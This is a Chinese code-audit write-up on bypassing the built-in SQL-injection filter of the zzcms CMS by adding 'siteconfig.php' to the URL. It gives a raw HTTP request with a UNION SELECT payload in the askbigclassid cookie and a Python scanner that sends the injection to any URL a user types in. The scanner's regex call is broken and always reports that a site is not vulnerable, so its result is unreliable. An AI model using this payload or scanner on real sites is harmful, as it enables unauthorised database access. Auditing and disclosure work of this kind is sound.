首先将|这个符合和他所定义的字符串连接，通过|为标志将他的字符串打散，变成单个字符串然后与GET和COOKIE和POST
传进去的参数进行判断如果有这些危险字符将停止程序运行。
这里的strpos()函数的作用是strpos($r_url,"template.php")在$_url中找siteconfig.php这个字符串如果找到就返回第一次出现的位置，没有返回0
    if (checksqlin=="Yes") {
    if (strpos($r_url,"siteconfig.php")==0
        && strpos($r_url,"label")==0
        && strpos($r_url,"template.php")==0) {
    foreach ($_GET as $get_key=>$get_var){ stopsqlin($get_var);} /* 过滤所有GET过来的变量 */      
    foreach ($_POST as $post_key=>$post_var){ stopsqlin($post_var); }/* 过滤所有POST过来的变量 */
    foreach ($_COOKIE as $cookie_key=>$cookie_var){ stopsqlin($cookie_var); }/* 过滤所有COOKIE过来的变量 */
    foreach ($_REQUEST as $request_key=>$request_var){ stopsqlin($request_var); }/* 过滤所有request过来的变量 */
    }
    }
    ?>
这里仔细看如果满足 if
的三个条件才会进入下面的stoplin()函数进行判断那么我这里是不是可以让他不满足这个if语句是不是就可以不去执行这个stopsqlin()这个函数，那么是不是就可以绕过sql注入检测，也就是网站自带的waf
并且配合之前的extract()这个函数是不是就可以达到一个攻击效果了
    strpos($r_url,"siteconfig.php")==0
    strpos($r_url,"label")==0
    strpos($r_url,"template.php")==0)
    //这里就是三个判断点，也就是绕过waf的关键点
先分析一次正常的请求过程
首先GET和COOKIE参数 传入zc_check()中过滤，然后获得当前请求的url，通过判断，传入到stopsqlin()函数
进行检测，如果有危险字符就停止，否则就执行。
在分析一次非正常请求
首先GET和COOKIE参数
传入zc_check()中过滤，然后获得当前请求的url，通过判断，判断失败直接跳过stopsqlin()这个函数，也就不进行对危险字符检查，从而绕过这个waf
这里开始对以上思路开始测试
## 二、构造payload
    GET /zzcms/admin/ask.php?do=add&s=siteconfig.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: askbigclassid=-1 union select database(),2,3,4,5,6,7,8,9,10,11
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
## 三、漏洞验证脚本
    # -*- coding: utf-8 -*-    import requests
    import re
    from bs4 import BeautifulSoup
    from colorama import init,Fore,Back,Style
    init(autoreset=True)
    print(Fore.RED+"""
    [[--------------------------------------------------------------------------------------------------------------]]
     ██████  ██   ██  ██████  ███████ ████████  ██████  ███    ██ ███████ ██   ██  █████   ██████ ██   ██ ███████   ]]
    ██       ██   ██ ██    ██ ██         ██    ██    ██ ████   ██ ██      ██   ██ ██   ██ ██      ██  ██  ██        ]]
    ██   ███ ███████ ██    ██ ███████    ██    ██    ██ ██ ██  ██ █████   ███████ ███████ ██      █████   █████     ]]
    ██    ██ ██   ██ ██    ██      ██    ██    ██    ██ ██  ██ ██ ██      ██   ██ ██   ██ ██      ██  ██  ██        ]]
     ██████  ██   ██  ██████  ███████    ██     ██████  ██   ████ ███████ ██   ██ ██   ██  ██████ ██   ██ ███████   ]] 
    Author:GhostOneHack                                                                                                           ]]                                                                                                                                                                                                                 
    [[--------------------------------------------------------------------------------------------------------------]]
    """)
    geturl = input("请输入网址：")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
    }
    url = geturl+"/admin/ask.php?do=add&s=siteconfig.php"
    cookie = {"askbigclassid":"-1 union select user(),2,3,4,5,6,7,8,9,10,11"}
    try:
        Geturl = requests.get(url=url,cookies=cookie,headers=headers)
        soup = BeautifulSoup(Geturl.text,"lxml")
        test = soup.find_all("option")[2]
        test = str(test)
        jiansuo = re.search(r"3",test).group(1)
        if jiansuo == '\"root@localhost\"' :
            print("存在此sql注入漏洞")
    except:
        print("不存在此漏洞")
## 四、渗透测试的一些思考
一、此次代码审计明白了一些黑盒测试的攻击手段，以及一些攻击思路。
二、学会代码审计会极大的帮助对于漏洞的理解。
三、所谓的0day也就是通过代码审计审计出来，进行代码审计的同时画一些思维导图比较好理解一点。
四、代码审计时要注意哪些变量可控，忽略无用的代码，进行逆向回退，从可能存在漏洞的地方进行回溯审计。
鸣谢  
[https://www.bilibili.com/video/BV1Cb4y1o7i7?from=search&seid=17125677856283527853&spm_id_from=333.337.0.0](https://www.bilibili.com/video/BV1Cb4y1o7i7?from=search&seid=17125677856283527853&spm_id_from=333.337.0.0)